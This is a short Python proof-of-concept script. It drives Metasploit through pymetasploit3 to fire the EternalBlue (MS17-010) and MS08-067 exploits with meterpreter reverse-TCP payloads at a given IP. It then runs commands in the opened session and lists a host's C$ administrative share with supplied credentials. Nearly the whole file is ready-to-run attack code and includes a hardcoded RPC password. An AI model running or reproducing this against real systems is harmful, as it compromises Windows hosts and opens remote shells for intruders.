import subprocess
import smbclient
from pymetasploit3.msfrpc import MsfRpcClient
class poc_module:
    def __init__(self,ipaddress):
        self.ip = ipaddress
    def smb_account_poc(self,username,password,domain):
        try:
            smb = smbclient.SambaClient(server=ipaddress, share="C$", username=username, password=password, domain=domain)
            exploit_folder = smb.listdir('/')
            return exploit_folder
        except:
            exploit_folder = "NULL"
            return exploit_folder
    def ms17010_poc(self):
        client = MsfRpcClient('1qaz@WSX', ssl=False)
        exploit = client.modules.use('exploit','windows/smb/ms17_010_eternalblue')
        exploit['RHOSTS']  = self.ip
        exploit.execute(payload='windows/x64/meterpreter/reverse_tcp')
        if bool(client.sessions.list):
            session_number = list(client.sessions.list.keys())[0]
            print(session_number)
            shell = client.sessions.session(session_number)
            shell.write('dir')
            result = shell.read()
            print(result)
            result.split(' ')
            return result[:240:]
        else:
            print("null")
            return "NULL"
    def ms08067_poc(self):
        client = MsfRpcClient('1qaz@WSX', ssl=False)
        exploit = client.modules.use('exploit','windows/smb/ms08_067_netapi')
        exploit['RHOSTS']  = self.ip
        exploit.execute(payload='windows/meterpreter/reverse_tcp')
        print("here")
        if bool(client.sessions.list):
            session_number = list(client.sessions.list.keys())[0]
            shell = client.sessions.session(session_number)
            shell.write('netstat')
            result = shell.read()
            print(result)
            result.split(' ')
            print(result)
            return result[:240:]
        else:
            print("null")
            return "NULL"

print(poc_module("192.168.1.180").ms17010_poc())